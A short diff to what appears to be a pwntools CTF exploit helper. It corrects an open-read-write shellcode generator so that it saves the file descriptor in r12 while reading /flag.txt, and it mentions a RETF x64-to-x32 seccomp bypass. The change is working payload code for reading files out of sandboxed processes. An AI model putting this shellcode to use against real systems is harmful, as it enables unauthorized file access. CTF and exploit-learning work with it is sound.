@@ -55,10 +55,10 @@ def orw_strategies(path=b"/flag.txt", buf=0x404800, size=0x100):
 
     # fd reuse (open returns 3, reuse)
     sc3 = shellcraft.open(path.decode())
-    sc3 += "mov r4, rax\n"  # save fd
-    sc3 += shellcraft.read("r4", buf, size)
+    sc3 += "mov r12, rax\n"  # save fd in 64-bit callee-saved register
+    sc3 += shellcraft.read("r12", buf, size)
     sc3 += shellcraft.write(1, buf, size)
-    yield ("fd_reuse_r4", asm(sc3))
+    yield ("fd_reuse_r12", asm(sc3))
 
     # x32 alias style (for RETF x64->x32 bypass docs)
     sc4 = """
